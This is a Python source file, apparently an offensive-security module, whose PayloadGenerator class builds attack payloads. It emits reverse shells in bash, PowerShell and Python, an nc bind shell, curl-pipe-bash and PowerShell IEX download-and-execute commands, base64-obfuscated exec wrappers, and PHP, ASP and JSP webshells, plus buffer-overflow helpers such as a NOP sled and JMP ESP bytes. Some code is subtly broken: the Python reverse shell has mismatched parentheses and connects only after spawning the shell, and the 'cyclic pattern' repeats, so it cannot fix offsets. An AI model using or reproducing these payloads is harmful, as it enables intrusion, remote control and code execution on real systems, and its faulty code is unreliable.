#!/usr/bin/env python3
"""
Payload Generator
Generate various network payloads and shellcode
"""

import os
import struct
import random
import string
from typing import Optional, List


class PayloadGenerator:
    """Network and shell payload generator"""
    
    @staticmethod
    def reverse_tcp_shell(host: str, port: int, platform: str = 'linux') -> bytes:
        """Generate reverse TCP shell payload"""
        if platform == 'linux':
            # Bash reverse shell
            return f"bash -i >& /dev/tcp/{host}/{port} 0>&1".encode()
        elif platform == 'windows':
            # PowerShell reverse shell
            return f'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'{host}\',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{$_ -as [byte]}};while(($i = $stream.Read($bytes, 0,$bytes.Length)) -ne 0){{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);Write-Host $data -NoNewline;$sendback = (Read-Host);$stream.Write([text.encoding]::ASCII.GetBytes($sendback),0,$sendback.Length);$stream.Flush()}};$client.Close()"'.encode()
        elif platform == 'python':
            return f"python -c 'import socket,subprocess,os;os.dup2(s:=socket.socket()).fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"]);s.connect((\"{host}\",{port}))'".encode()
        return b''
    
    @staticmethod
    def bind_shell(port: int, platform: str = 'linux') -> bytes:
        """Generate bind shell payload"""
        if platform == 'linux':
            return f"nc -lnvp {port} -e /bin/bash".encode()
        elif platform == 'windows':
            return f'powershell -nop -c "$listener = New-Object System.Net.Sockets.TcpListener({port});while($true){{$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{$_ -as [byte]}};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = Read-Host;$stream.Write([text.encoding]::ASCII.GetBytes($sendback),0,$sendback.Length);$stream.Flush()}}}}"'.encode()
        return b''
    
    @staticmethod
    def download_execute(url: str, args: str = '', platform: str = 'linux') -> bytes:
        """Generate download and execute payload"""
        if platform == 'linux':
            return f"curl {url} | bash {args}".encode()
        elif platform == 'windows':
            return f"IEX(New-Object Net.WebClient).DownloadString('{url}') | IEX; {args}".encode()
        return b''
    
    @staticmethod
    def python_oneliner(code: str, obfuscate: bool = False) -> bytes:
        """Python one-liner payload"""
        if obfuscate:
            code = code.replace(' ', '').replace('\n', ';')
            import base64
            encoded = base64.b64encode(code.encode()).decode()
            return f"python -c 'import base64;exec(base64.b64decode(\"{encoded}\"))'".encode()
        return f"python -c '{code}'".encode()
    
    @staticmethod
    def php_webshell(password: str = 'pass') -> str:
        """Generate PHP webshell"""
        return f"""<?php
if(isset($_POST['{password}'])){{
    eval($_POST['cmd']);
}} elseif(isset($_GET['{password}'])) {{
    echo '<pre>';
    system($_GET['cmd']);
    echo '</pre>';
}}
?>
"""
    
    @staticmethod
    def asp_webshell(password: str = 'pass') -> str:
        """Generate ASP webshell"""
        return f"""<%
If Request.Form("{password}") <> "" Then
    Execute Request.Form("cmd")
End If
If Request.QueryString("{password}") <> "" Then
    Response.Write Server.CreateObject("WScript.Shell").Exec(Request.QueryString("cmd"))
End If
%>
"""
    
    @staticmethod
    def jsp_webshell(password: str = 'pass') -> str:
        """Generate JSP webshell"""
        return f"""<%
if(request.getParameter("{password}") != null){{
    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while((line = br.readLine()) != null) out.println(line);
}}
%>
"""
    
    @staticmethod
    def random_string(length: int = 32, charset: str = None) -> str:
        """Generate random string"""
        if charset is None:
            charset = string.ascii_letters + string.digits
        return ''.join(random.choice(charset) for _ in range(length))
    
    @staticmethod
    def random_payload(size: int = 1024) -> bytes:
        """Generate random binary payload"""
        return os.urandom(size)
    
    @staticmethod
    def nop_sled(size: int = 64) -> bytes:
        """Generate NOP sled (x86)"""
        return b'\x90' * size
    
    @staticmethod
    def x86_jmp_esp() -> bytes:
        """x86 JMP ESP instruction"""
        return b'\xff\xe4'
    
    @staticmethod
    def x86_int3() -> bytes:
        """x86 INT3 breakpoint"""
        return b'\xcc'
    
    @staticmethod
    def null_bytes(size: int = 256) -> bytes:
        """Null byte padding"""
        return b'\x00' * size
    
    @staticmethod
    def generate_pattern(length: int = 5000) -> bytes:
        """Generate cyclic pattern for offset detection"""
        charset = string.ascii_uppercase + string.ascii_lowercase + string.digits
        pattern = b''
        index = 0
        
        while len(pattern) < length:
            pattern += charset[index % len(charset)].encode()
            index += 1
        
        return pattern[:length]
    
    @staticmethod
    def find_pattern_offset(pattern: bytes, payload: bytes) -> int:
        """Find offset of pattern in payload"""
        pat_len = len(pattern)
        
        for i in range(len(payload) - pat_len + 1):
            if payload[i:i+pat_len] == pattern:
                return i
        
        return -1
